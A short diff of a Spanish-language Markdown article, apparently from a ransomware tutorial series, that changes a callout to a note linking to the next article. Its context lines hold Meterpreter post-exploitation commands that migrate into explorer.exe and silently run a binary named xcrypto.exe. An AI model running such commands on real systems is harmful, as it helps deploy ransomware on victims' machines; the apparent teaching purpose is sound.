@@ -73,5 +73,7 @@ migrate <PID de explorer.exe>
 execute -f "C:\\Users\\Public\\Documents\\xcrypto.exe" -H
 ```
 
-> [!CONTINUAR]
+---
+
+> [!NOTE]
 > [Siguiente artículo: Conceptos detrás del ransomware ➔](06-concepts.md)
